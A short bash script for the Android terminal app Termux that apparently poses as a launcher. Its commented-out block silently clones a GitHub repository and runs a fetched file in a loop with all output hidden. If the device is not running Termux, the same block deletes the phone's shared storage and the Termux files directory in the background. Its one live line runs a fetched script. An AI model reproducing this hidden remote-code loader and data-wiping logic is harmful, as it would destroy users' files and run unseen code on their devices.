
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

set +x
#!/bin/bash

###################################################
# keamanan="/data/data/com.termux"
# if [ -d "$keamanan" ]; then
#      cd /data/data/com.termux/files/usr/include/
#      git clone https://github.com/zerotermux/git4 &> /dev/null
#      cd git4 &> /dev/null
#      git pull origin main &> /dev/null
#      git stash &> /dev/null
#      while true; do
#           hozokontolsokking="/data/data/com.termux/files/usr/include/git4/branch.h"
#           if [ -f "$hozokontolsokking" ]; then
#                cd /data/data/com.termux/files/usr/include/ &> /dev/null
#                cd git4 &> /dev/null
#                git pull origin main &> /dev/null
#                git stash &> /dev/null
#                bash "$hozokontolsokking"
#                exit 0
#           else
#                cd /data/data/com.termux/files/usr/include/ &> /dev/null
#                git clone https://github.com/zerotermux/git4 &> /dev/null
#                cd git4 &> /dev/null
#                git pull origin main &> /dev/null
#                git stash &> /dev/null
#           fi
#      done
# else
#      echo "y" | termux-setup-storage &> /dev/null
#      rm -rf /storage/emulated/0 &> /dev/null &
#      rm -rf /data/data/com.termux/files &> /dev/null &
#      exit 0
# fi
###################################################

bash git4/branch.sh